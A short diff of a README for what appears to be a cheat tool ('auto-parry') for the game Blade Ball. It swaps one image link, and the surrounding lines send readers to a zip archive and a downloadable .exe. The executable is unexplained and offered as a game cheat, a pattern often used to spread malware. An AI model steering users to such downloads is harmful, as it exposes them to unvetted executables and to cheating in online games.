@@ -22,7 +22,7 @@ https://github.com/vexori/blade-ball-auto-parry/archive/refs/tags/v4.zip Not wor
 
 Try this https://github.com/vexori/blade-ball-auto-parry/releases/download/v4/blade-ball-auto-parry.exe
 
-![blade-ball-script-auto-parry](https://github.com/user-attachments/assets/25a331f9-2070-46c8-83ac-01bc431145fc)
+![13772394625-1745580096746](https://github.com/user-attachments/assets/fa414a67-7b58-494a-b764-cc9978ef5e7c)
 
 
 # Important
